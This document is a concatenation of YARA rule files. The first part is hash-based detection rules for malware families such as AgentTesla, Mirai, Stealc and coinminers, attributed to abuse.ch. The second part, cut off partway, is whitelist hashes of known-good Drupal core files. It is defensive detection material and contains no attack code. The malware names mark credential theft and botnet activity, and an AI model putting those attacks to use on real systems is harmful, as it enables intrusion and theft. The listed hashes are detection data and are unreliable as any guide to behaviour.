hash.sha256(0, filesize) == "f93737e8575d0af497e1432588bea5d62c86f7984605af2c257002b73563d0f8" or
hash.sha256(0, filesize) == "1263a6f6ffb8706a7785cc11b08c4a9c6609a3823ca758dbc4777b4639ebd2a8" or
hash.sha256(0, filesize) == "a3e4cc3747006495c9cae3e6f08010b8368ebd5883b556e021a923fc20f5bef1" or
hash.sha256(0, filesize) == "de370b8f6e1ebb2f43c5fb9ac7392cc5c70224f10c31bdad38cf369744d03d52" or
hash.sha256(0, filesize) == "03ff02d6d7a259734c8733614089ac81324a837102a6ae3484491cfe7eed975f" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_COINMINER_elf
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_COINMINER_LAB"
date_IOC = "2023-11-15 09:24:49"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "COINMINER"
file_type = "elf"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "199c01b177aa7c4bb01dae876012c696e4e30aada4cf1c7edf7936eee0d7876e" or
hash.sha256(0, filesize) == "5082ed106ffd1f4f71e016e49b88c0e61d3ffd00f7860ebc4fa1406735cd84da" or
hash.sha256(0, filesize) == "151df3364d6d3ff361ed45ea944386ad8b45fc8327929447de5f7a86bc19547b" or
hash.sha256(0, filesize) == "0233e973071b55934eeafc66da12e02587c5b1604d3b300ccbc44f018c2b80cf" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_AGENTTESLA_rar
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_AGENTTESLA_LAB"
date_IOC = "2023-11-14 08:16:01"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "AGENTTESLA"
file_type = "rar"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "cc9ceb589bbbf22fee3f7456b0269d06773a6e96974aa20936868bcbbce88ba6" or
hash.sha256(0, filesize) == "ff28a45905e0bb9d9af43c5e4d8e8fa27248880cb7a24d2bd7c16d5ddcdb8caf" or
hash.sha256(0, filesize) == "4bc3218865e598320faef41090da4ab23101fff8531ffebcaf6523a0217ea898" or
hash.sha256(0, filesize) == "6f005ba0b96e1110d036613975314ef0827afae187ac93384770ea57c3103c26" or
hash.sha256(0, filesize) == "2c1ac1fdee3753349c582a5a518c301baee1144d0ab52827792919dcf3e4c7cd" or
hash.sha256(0, filesize) == "1bc363ba8df6cc044fe7eea73aab1ec7276ee28afa716b19e5681335189aa070" or
hash.sha256(0, filesize) == "ad654aeceeb0af81e68181bb70bfe413527895eb4b23b378bb084129f9ae1a0c" or
hash.sha256(0, filesize) == "861f1511b4464e0c3fd64db843fe357894204b1427014232c6c7434b02947811" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NA_doc
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NA_LAB"
date_IOC = "2023-11-14 14:54:58"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NA"
file_type = "doc"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "44b2f311eaba2e49b175ac9126fdcee092b1bfce3f7d5581a615c80afcfd0d1a" or
hash.sha256(0, filesize) == "54376ee15cca7c6cdecc27b701b85bdd2aa618fe8158a453d65030425154299a" or
hash.sha256(0, filesize) == "d8a012a24aa805042bc416d6d72694d6c3c0b726b571f5ef57ecab8690b87b99" or
hash.sha256(0, filesize) == "976c4fdf5120d4a6e6b5d1cd26d70244fb788ea1cb50031a129ea8da9509f86a" or
hash.sha256(0, filesize) == "69f1ebe7c4fafa1798aa4ccdc52785e5015456e2837b9a234031884f196fda62" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_AGENTTESLA_zip
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_AGENTTESLA_LAB"
date_IOC = "2023-11-14 08:46:46"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "AGENTTESLA"
file_type = "zip"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "5841001fb1a91673e31a012d599cbad0e47c93c37beba3426e7fda17dcca5cd4" or
hash.sha256(0, filesize) == "8dc7626964bb2236228f1cd54d064c5a03deeecb0fd4cd64ee010e36bb046d23" or
hash.sha256(0, filesize) == "b05c4c012a23a232bb4cb07b15af09c7df8ff87cd664f6169bf2b9cf0ec392d3" or
hash.sha256(0, filesize) == "0598d24987b6a7a5421e7e34589b81a5f2ff9e8e1f176569d0f4d33783e93f57" or
hash.sha256(0, filesize) == "ceb734f8c9859a740dc419596343529552f55f8956790a001b33850ca5150c35" or
hash.sha256(0, filesize) == "51024442ed796e4de733bbbc83457b1cc193ab447e428a2a58972ce338864b6a" or
hash.sha256(0, filesize) == "2d0c195cad42c20024600cfa6643a66c7dfe17ec96cc5f36bddb3b48f53ba0ea" or
hash.sha256(0, filesize) == "6767b678fcd5cf5e973501473e540fe5c1c716101b952071f075d9ba0402be77" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_GAFGYT_elf
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_GAFGYT_LAB"
date_IOC = "2023-11-14 19:12:25"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "GAFGYT"
file_type = "elf"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "b6ee6cc4d468044d42a71e0cc4ae1b15a352baa52e84671f8a0e8bba743e8788" or
hash.sha256(0, filesize) == "2b2ec22f0dd019563b5ca08f2956b78a72fe009c86dd581885b11a8feedf5bc9" or
hash.sha256(0, filesize) == "5ae7b28dbd86a21f6686e0db77f06536e9a090569e78b0d60e9c924dacc3b7e2" or
hash.sha256(0, filesize) == "41382ba72b27d90f0c8e72293cccce520751d1b87a841e72be95f558b0bea002" or
hash.sha256(0, filesize) == "7f571631dc5974149b8f7165b999f09f179e5674260b173fe0bbc38e221a8e88" or
hash.sha256(0, filesize) == "e85426f6c3244bdf96fde023e7e2d25d88b061a7ae622203427247068af067cb" or
hash.sha256(0, filesize) == "e1a6bd6f51a9fcae5e8fccc41554f19c431b1418dec4964947c18d643a1bcdef" or
hash.sha256(0, filesize) == "34254e7c3ec86e864cfc6f88a62bb25187cddefcfaaa6079926ef374fdb74b5e" or
hash.sha256(0, filesize) == "4a74258dd1dd503a07111074382b11f791c03e94dddc06d04680ae0d61f98de6" or
hash.sha256(0, filesize) == "74426a4c85dc167e3d82b2f405d9a9ab6b9e2cf4c7ee93fce8a9a0a5fd21c823" or
hash.sha256(0, filesize) == "83981024c834aacc141729a185cc3f3771e04feb8632ea209d47909e3b82d4b1" or
hash.sha256(0, filesize) == "d511c100966b936df679e667e2cc18bd4bdef37c2d65ddd5ff32932b4815309c" or
hash.sha256(0, filesize) == "53d5d833fb1e0b2df11b1c33e696fb490576d1a54b9d509eafe19afa9ee67912" or
hash.sha256(0, filesize) == "3c7dfa7bd2bd84da4d5be3357806bbc792428bb82a5acb0f350c01affd1a7a8f" or
hash.sha256(0, filesize) == "e827b2fa3363a526db964ea77b13a38edf35996619f1bf5bf5e5ecc6179b4989" or
hash.sha256(0, filesize) == "eac009df353d224b3a564310e10e1aea77e0cb8806e56ec0c8dbe84a3af4747e" or
hash.sha256(0, filesize) == "96041a9b535707f03ead8059db28c2fd76247794c2020eba53e09e52c2e45bb6" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_MIRAI_elf
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_MIRAI_LAB"
date_IOC = "2023-11-14 06:10:22"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "MIRAI"
file_type = "elf"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "c8112fddbfed0adfa62343a770dc09984c306063cfe01e4989f8a96893fdb908" or
hash.sha256(0, filesize) == "0e9ec7fffe192bb53a79d9a71ba74884bc9493cc55c6e363e7ad952c53da25fe" or
hash.sha256(0, filesize) == "eec68e0190cb6b7683556b3fde3922936b0b0a70d0efd2062c53c87f2adfdb1f" or
hash.sha256(0, filesize) == "0433abed1161da8a9c18a8855f9a65d9dd2ce66392107e989e058e510033f26e" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_LOKI_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_LOKI_LAB"
date_IOC = "2023-11-14 20:10:07"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "LOKI"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "d4285f204614a02df0ce4b1e6e80f402057495dfcdba66993fb94ad5e686e2bd" or
hash.sha256(0, filesize) == "0a9a1a3c031e0eb6c938510830144f26f88effe94230b1467e09123393b99650" or
hash.sha256(0, filesize) == "835179a5b8a9c27a30cd81a9caa1e5af30f9e2fc9e6c1cc0c05187049d184faf" or
hash.sha256(0, filesize) == "c6a124887bee7710a6bfebbc4af9a094cab70e3b82e2bf82a2c75b96424b6142" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_MARSSTEALER_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_MARSSTEALER_LAB"
date_IOC = "2023-11-14 08:40:14"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "MARSSTEALER"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "487ca2266b9ddac43dde09ad484b1b73ca38071698bfda25d419dcf6c5ed3a22" or
hash.sha256(0, filesize) == "961fa39e74e92717c34a65cefca250df55cfc76faf1780c45e6b7dfc0fc80eca" or
hash.sha256(0, filesize) == "b4177d3d69f7951f46d07b01204fc749befc81531720de78ab7e75e93db35c58" or
hash.sha256(0, filesize) == "349f4ed12f7b4cd5d2cecc282f03ca70a28518094973e66749086920ec47fea4" or
hash.sha256(0, filesize) == "a79f593a22f2698e351aee60ab23afdaa239ef545297e495df30ecedb99fe222" or
hash.sha256(0, filesize) == "f94464959b33782231ae5a82624d3407833a812cb17c09bca2647e4476b78fde" or
hash.sha256(0, filesize) == "e878a8eca5b7f4408bfbd0ccd365f04d4e7d0735a45ea3228ffc322fbb36ee9b" or
hash.sha256(0, filesize) == "c1463af12fd0e9bda5b5c94381ea22d82abd5d95008ffb77894c5be3c77e3bbc" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_SMOKE_LOADER_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_SMOKE_LOADER_LAB"
date_IOC = "2023-11-14 08:55:41"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "SMOKE_LOADER"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "ea226ab509f8001582cace500f1890df678371771cf7ee1cf1d61f949f201c5e" or
hash.sha256(0, filesize) == "d2a5bffc667647e9ba8a0d1733f9a27df01af72b9dbc7193031aad4c8853c6e4" or
hash.sha256(0, filesize) == "22f1911d81e0e2feaf26b7b28208b5cbb68be45c39d5a6630c40047de2446f4e" or
hash.sha256(0, filesize) == "a6189864b80a674de976bc67a13f42fc6e601f2ea11c446047c84e2d12e120ae" or
hash.sha256(0, filesize) == "95396f2372d133a24cb6a06307c865f37441cb985baa6ce021387ac7b0a2de91" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_ADWARE_NEOREKLAMI_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_ADWARE_NEOREKLAMI_LAB"
date_IOC = "2023-11-14 09:01:29"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "ADWARE_NEOREKLAMI"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "fd5d862f187f2b06569ceba8c3cf0960f6446904d88ec36da96cde8ba984e17b" or
hash.sha256(0, filesize) == "5b8a371c20b16861e2dfc33f4757ffab43c79361a21099d92acda671e46d1f3d" or
hash.sha256(0, filesize) == "7918ab26eeb714d19d3af80cc905ad014ac6e6a337d7bec51206d17a6ddb24e0" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_STEALC_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_STEALC_LAB"
date_IOC = "2023-11-14 08:09:03"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "STEALC"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "18db81d906e97ea89314ddaa87811b43e349e08a2af276dcfe21f3031131e69f" or
hash.sha256(0, filesize) == "0552f23284ed52e84060cdc66d242f9258bbe0555eab899355b9d848bbf70605" or
hash.sha256(0, filesize) == "60e9383ff5038ed988a1b988b66091bac7bf93a6d070763f45479dccdfd9d147" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_GLUPTEBA_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_GLUPTEBA_LAB"
date_IOC = "2023-11-14 03:47:09"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "GLUPTEBA"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "e26a36702257f07a25adc0e5b1a3ceeabcbcb18b63c8d83c0ccb988f848e4a08" or
hash.sha256(0, filesize) == "7e2fc238252c47231d37ab938055672b07423ce2688bb32cff3b97dc179fee9b" or
hash.sha256(0, filesize) == "3648e16fc4cff692d591d0074ce50481a5a3451153a875ddde85ee82dea63614" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_RECORDBREAKER_exe
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_RECORDBREAKER_LAB"
date_IOC = "2023-11-14 10:05:08"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "RECORDBREAKER"
file_type = "exe"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "9b6a1d1a00ddd716e344cc64e5592291bb2eb2f5d36a95a32a7b2bddd02a1402" or
hash.sha256(0, filesize) == "c3ca3799150177eddce80d6eaf8905f29b02c31651f565a913690b83ba36a788" or
hash.sha256(0, filesize) == "1abb8e978cc50ac436946ba779cfc8bdd5022a6251aca2d761b09b5a6433fbee" or
hash.sha256(0, filesize) == "114e74be49ed1e1bc90c85a74aaf60fbc8d766d0e8755c100ffab51a43d71404" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_NETSKY_zip
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_NETSKY_LAB"
date_IOC = "2023-11-14 12:23:33"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "NETSKY"
file_type = "zip"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "6f03ec60269a12b5067044a49f64c77108828bec971cacd120bf777d4c2b8fc0" or
hash.sha256(0, filesize) == "58a6efaa90c5ee105e520c14c687f9ebefd733dd7d0f9eb599631b650804eb41" or
hash.sha256(0, filesize) == "8bcd589ae4587480a36aaa7d1c610308f7915195dab6cfe95c106bf854c8e1f6" or
hash.sha256(0, filesize) == "13b7d1449daae56c1d9e61b2b877a1f06cb1889eb2e7adb895a7af5695bf9eed" or
hash.sha256(0, filesize) == "2daaafa914c24ec2d2191907e05d92738f5bd0da020bf7c696d1a7664273e175" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}


rule IOC_AGENTTESLA_7z
{
meta:
author = "Laboratoire Epidemiology & Signal Intelligence"
ref_IOC = "IOC_AGENTTESLA_LAB"
date_IOC = "2023-11-14 08:08:31"
info = "Version 1.0 b"
internal = false
score = 99
risk_score = 10
threat = "AGENTTESLA"
file_type = "7z"
comment = "Source : abuse.ch"


condition:
hash.sha256(0, filesize) == "04a69ab46c2e8bbdb13a2da0516d6caad98637405e6f7c580c18cd46b3b8094f" or
hash.sha256(0, filesize) == "42296e0960cd2bebfb412cfe15f7bdf9f8d0fe2587afc0d09fb1f8655a273a87" or
hash.sha256(0, filesize) == "458f3af48bcb01ad84a623f56afa02b5bc4758b6e4b7c0c3cd1e0224254b1302" or
hash.sha256(0, filesize) == "99d376b4afcda6983c0030431b264aaedcfc09d7b805fe0d3c372175695da8a8" or
hash.sha256(0, filesize) == "caeb162a67c1946c9234161ea37cc50fa5956fce5a3296ef36b7f9a6ba68f889" or
hash.sha256(0, filesize) == "6d833846ce0ffab7ee3c9f8872fc99e9a06ce8fa0cbcbeb039c00ba209256116" or
hash.sha256(0, filesize) == "831abc8d1a70104ae46b5c2c1ce6fce24ef449a03bde0d770a5a67f96ab22e7c"
}import "hash"
/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/

/* Add your own rules here */
import "hash"

private rule Cusaom : Blog
{
    meta:
        generated = "2016-07-28T09:50:53.795037"

    condition:
        /* my own webapp 0.42 */
        hash.sha1(0, filesize) == "deadbeaf"
}

/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/

import "hash"

private rule Drupal : CMS
{
    meta:
        generated = "2018-05-29T22:23:47.366743"

    condition:
        /* Drupal 5.0 */
        hash.sha1(0, filesize) == "f1eb3d374f15f22b20bfd75ee313857023ea364f" or // modules/color/color.module
        hash.sha1(0, filesize) == "1730e4fb6d18b065679fe914da683ce0c919d291" or // themes/garland/template.php
        hash.sha1(0, filesize) == "34715498bee1ecfe749d6a73a3e98775ace745e1" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "bf4a657c57358f7184da9c0403ff8f594da26fe4" or // modules/system/system.install
        hash.sha1(0, filesize) == "bd19a66385c4d84321a4a0fcad09592da5a8767c" or // includes/form.inc
        hash.sha1(0, filesize) == "93b7741008635667702e9657a6db496a21df3bbb" or // includes/xmlrpc.inc

        /* Drupal 5.1 */
        hash.sha1(0, filesize) == "e7600251d12b48a85a7e1e1ad35cc8bf03d9e370" or // modules/color/color.module
        hash.sha1(0, filesize) == "6569f949cecb5a074334d6e94ec0a4d550eaf367" or // includes/form.inc

        /* Drupal 5.2 */
        hash.sha1(0, filesize) == "05b40483364714c310d18526b856d5b823c50326" or // modules/color/color.module
        hash.sha1(0, filesize) == "c5e4b8f163bb7580d82d37008f084f15cecb7d88" or // themes/garland/template.php
        hash.sha1(0, filesize) == "3bf375e99b5fe211e6e2d8c512e348dcb08eda09" or // modules/system/system.install
        hash.sha1(0, filesize) == "689adbac4c770fb2312a32943ab57c366522b43b" or // includes/form.inc
        hash.sha1(0, filesize) == "f7c0c92ba2ac49b33cf333abf5c7638f45b12b74" or // includes/xmlrpc.inc

        /* Drupal 5.3 */
        hash.sha1(0, filesize) == "1565b1cfac5b9f8773338c52df83e643b238aa24" or // modules/color/color.module
        hash.sha1(0, filesize) == "633d701d7aaee4eeb1f86128fcedec43aade6d6c" or // modules/system/system.install

        /* Drupal 5.4 */
        hash.sha1(0, filesize) == "235a2ba6ce07344c8e7c544fd13d50e489871315" or // modules/color/color.module
        hash.sha1(0, filesize) == "3ba8b759ca4215a87affd1d46142745f2affe298" or // modules/system/system.install
        hash.sha1(0, filesize) == "49d374c029d4713879dd3c31afb4617307816388" or // includes/form.inc

        /* Drupal 5.6 */
        hash.sha1(0, filesize) == "7703e318cd7972790fc2b2171a756e4d51db5376" or // includes/xmlrpc.inc
        hash.sha1(0, filesize) == "0acf5f02c673d7c2e215e80b3e9c44c9a66bb493" or // includes/form.inc

        /* Drupal 5.8 */
        hash.sha1(0, filesize) == "9ef2f823596c2ad04a186f303376d06d78d2fc1b" or // includes/xmlrpc.inc
        hash.sha1(0, filesize) == "dcb29e1e0372fe1c56480cde6af09d7a4518ac09" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "e682ea838bae85ec2c1f2a06c6a7c49b545ec0ef" or // modules/color/color.module

        /* Drupal 5.10 */
        hash.sha1(0, filesize) == "3a06dd7ce5a2a4aa9542ced4c20f375643191b8f" or // includes/xmlrpc.inc
        hash.sha1(0, filesize) == "ce633ea58a6de51e36f4c4cb7644e26b01480780" or // includes/form.inc

        /* Drupal 5.11 */
        hash.sha1(0, filesize) == "3aebbcd0f6b90304ddfb52edff97e20f6d7aef95" or // includes/xmlrpc.inc
        hash.sha1(0, filesize) == "e5a533fddac060cf3146c347999595c58a159882" or // includes/form.inc

        /* Drupal 5.15 */
        hash.sha1(0, filesize) == "07b090bf9c8cf6736466a23c8f5925ffab837e44" or // modules/color/color.module
        hash.sha1(0, filesize) == "7b380e59f08d11a6d7c890cefbb2358fae24a434" or // includes/form.inc

        /* Drupal 5.17 */
        hash.sha1(0, filesize) == "d8687f6b0772b1f80d3e44a8b1e1fbb94202e5d1" or // includes/form.inc

        /* Drupal 5.22 */
        hash.sha1(0, filesize) == "23c6b18c7f4f599da8157b033f59e3425cc893f5" or // modules/locale/locale.module

        /* Drupal 6.0 */
        hash.sha1(0, filesize) == "3c01c46acb9f8e2a5dc41ef849766defde662ecd" or // includes/batch.inc
        hash.sha1(0, filesize) == "8c0212cf85917607951dfe4ea2a9aa49dc8872a4" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "f92e2b1f7e899b18059bbdb4d3c9e938bb29a8ea" or // themes/garland/template.php
        hash.sha1(0, filesize) == "3cfbb369d412fa5e67e2862a18394d29cdcf9b0c" or // includes/menu.inc
        hash.sha1(0, filesize) == "482c91441f49765f15734ddbbae1272f11345af4" or // modules/color/color.module
        hash.sha1(0, filesize) == "40e4979ecf0f1ac140d919b212f03239c5b6aa92" or // modules/system/system.module
        hash.sha1(0, filesize) == "81c8b9b2c63c300f052cd6cd114ba2723bd588fa" or // includes/form.inc
        hash.sha1(0, filesize) == "bd6052877cf3fd94647cbce96dbe6e56dc50e10f" or // includes/xmlrpc.inc

        /* Drupal 6.1 */
        hash.sha1(0, filesize) == "3c3376a298abc4128a5d694a4cd5fd85e828e031" or // includes/menu.inc
        hash.sha1(0, filesize) == "5e5f0081619c744d82203acdd685908286995fbd" or // modules/system/system.module

        /* Drupal 6.2 */
        hash.sha1(0, filesize) == "f2aae0d40ea29a7392c2d61048f1d4f3aaf045e5" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "ce03cc0cf33d2a0ca284d5fdef2d565a0083433c" or // includes/menu.inc
        hash.sha1(0, filesize) == "49ffaf6b8dd7860f4e3f087f7d1dc97a1bc275e6" or // modules/system/system.module
        hash.sha1(0, filesize) == "fc911bd9cc9325ec4886152db537cdfd8f4e64bb" or // includes/xmlrpc.inc

        /* Drupal 6.3 */
        hash.sha1(0, filesize) == "80b13389511ea6e684bebba943af093b1e981858" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "f92178aa9ef6362cded7cd8781c47eb83deb68be" or // includes/menu.inc
        hash.sha1(0, filesize) == "3dcd1690b4e1861ffaa896d33cd7f8b6498ea806" or // modules/system/system.module
        hash.sha1(0, filesize) == "bf20f4b2a6ffcf7c2338771153439082f39c460d" or // includes/form.inc
        hash.sha1(0, filesize) == "3a97f6da319588192cebfa3fe092dcda4412c6fa" or // includes/xmlrpc.inc

        /* Drupal 6.4 */
        hash.sha1(0, filesize) == "9b3b6f401a6c9b63e396b8c8dc687d7bae0f1b52" or // modules/system/system.module
        hash.sha1(0, filesize) == "831bf55ef200e3af6fd5cc59ff34499460349b5b" or // includes/form.inc

        /* Drupal 6.5 */
        hash.sha1(0, filesize) == "88eb3c9e014ac820a049987825d5f06b9e07f01b" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "3c20621fe031cfd9f77171491a8d84d38644768e" or // includes/menu.inc
        hash.sha1(0, filesize) == "7b768a62e50ae512a763b548704d5d50dcfcedb5" or // modules/system/system.module
        hash.sha1(0, filesize) == "7655e21aab65237f9bb767c9ebd8f9e8f80c254b" or // includes/form.inc
        hash.sha1(0, filesize) == "e16028c47285d1c8acb40917c5b7646dc43ba862" or // includes/xmlrpc.inc

        /* Drupal 6.6 */
        hash.sha1(0, filesize) == "582b5612950b654ca32185840672e4b39493f40c" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "70beea28b5e6599c53aae3de6da6ba84ce67f6df" or // includes/menu.inc
        hash.sha1(0, filesize) == "2e1b0bcc805cd538d544fdab801e79c9b42c5cc4" or // modules/system/system.module
        hash.sha1(0, filesize) == "67c5018ac240183211ad9e32e3490a491bfc21e3" or // includes/form.inc
        hash.sha1(0, filesize) == "d7badca996415761de8f4d44cf825567df60e79d" or // includes/xmlrpc.inc

        /* Drupal 6.7 */
        hash.sha1(0, filesize) == "9e8fb4a8241d37d52dc533e2aec9bdc9d44ac2c5" or // includes/menu.inc
        hash.sha1(0, filesize) == "d7295287f872616d6581963ca4fffc842877e54e" or // modules/system/system.module
        hash.sha1(0, filesize) == "0066f50873b4d8e826f5f9a3c2f931b9e449e3cf" or // includes/form.inc

        /* Drupal 6.8 */
        hash.sha1(0, filesize) == "522a021eabf04567c7d3ddfea8e80191a67b75c6" or // modules/system/system.module

        /* Drupal 6.9 */
        hash.sha1(0, filesize) == "47e69cf9117bd12900a7d0b322bbeb891cb876bd" or // modules/system/system.module
        hash.sha1(0, filesize) == "c35efa1e4c9e0793b890c0e7900617b7a708d906" or // includes/form.inc
        hash.sha1(0, filesize) == "9d3ef642d7f227b0a2a922c16fd04d7ae51fbbac" or // includes/xmlrpc.inc

        /* Drupal 6.10 */
        hash.sha1(0, filesize) == "1257503f9f9e90f0de517c0ec613d28476608f94" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "a9a48782feda7033d80d10077fbdf901478882b0" or // themes/garland/template.php
        hash.sha1(0, filesize) == "303b2365a1068f10362712ba57f8aa11641986ee" or // includes/menu.inc
        hash.sha1(0, filesize) == "f9a57bbb528fd3cab334f72fc7295fb32266aeec" or // modules/color/color.module
        hash.sha1(0, filesize) == "9958a8bbc30b7b235982f21f6c58fbbdf53e481d" or // modules/system/system.module
        hash.sha1(0, filesize) == "00a2edf2e518509dc352f407f4aaebd9e9432ea2" or // includes/form.inc

        /* Drupal 6.11 */
        hash.sha1(0, filesize) == "5cbbcac5697b1e3cbfc7c7071aa99d8eab48b9fa" or // includes/menu.inc
        hash.sha1(0, filesize) == "ca4b910750e51db3c7ad6859ce6bb19da6d119fa" or // modules/system/system.module
        hash.sha1(0, filesize) == "3dfc875a3fb589625dc7a45fdbf6e322f560c4af" or // includes/form.inc

        /* Drupal 6.12 */
        hash.sha1(0, filesize) == "13e042bbd65139c41ebcab31b2d7f82343044a60" or // modules/system/system.module
        hash.sha1(0, filesize) == "45aee133a5c7c39c932e97939c8333a09ecdaa58" or // includes/form.inc

        /* Drupal 6.13 */
        hash.sha1(0, filesize) == "a607ad688c31b9bbf56f933f9d942f1771f6eee7" or // modules/color/color.module
        hash.sha1(0, filesize) == "21778d2e8795c1deba246006623621efe5b0349d" or // modules/system/system.module
        hash.sha1(0, filesize) == "6ed25b5b4e1292685e81537d6c6d49e4140c080c" or // includes/form.inc

        /* Drupal 6.14 */
        hash.sha1(0, filesize) == "03e44afcb7dc4b0a8acde5f89a6cba050537cc91" or // modules/node/node.module
        hash.sha1(0, filesize) == "98e92c349a39518cf5a56236070c2585eae773d3" or // includes/locale.inc
        hash.sha1(0, filesize) == "5a8177828846fbfe19f4b1faf2d23d6481fba20c" or // themes/garland/template.php
        hash.sha1(0, filesize) == "1ebddd7ba111f431149df0ee5f589671637aef4a" or // modules/system/system.module
        hash.sha1(0, filesize) == "b6977eb520a2bd3fe759f828c764cf898cf2e556" or // includes/form.inc

        /* Drupal 6.15 */
        hash.sha1(0, filesize) == "fd20764485c46379fadb3e58db23ec8cabd28578" or // modules/node/node.module
        hash.sha1(0, filesize) == "2b63f034c12d60202f689283f087f6f5f48946c1" or // includes/menu.inc
        hash.sha1(0, filesize) == "ab7b91796db0ef4681b5e67e95e03a009c688c5f" or // modules/system/system.module
        hash.sha1(0, filesize) == "80a31ba9e3a927adda8e57668c8ec970d6a207a6" or // includes/form.inc

        /* Drupal 6.16 */
        hash.sha1(0, filesize) == "3756e7b875afe0669c0d3256c1d93afe29e755d7" or // modules/node/node.module
        hash.sha1(0, filesize) == "ecd57dc215a2944b78968fa709812cf320446fc6" or // modules/locale/locale.module
        hash.sha1(0, filesize) == "0078d227e54de10cb9d2460f3b18d8ceb6fdb86e" or // includes/locale.inc
        hash.sha1(0, filesize) == "0a7d62958d36a81c9e938f199e8c760123727baf" or // includes/menu.inc
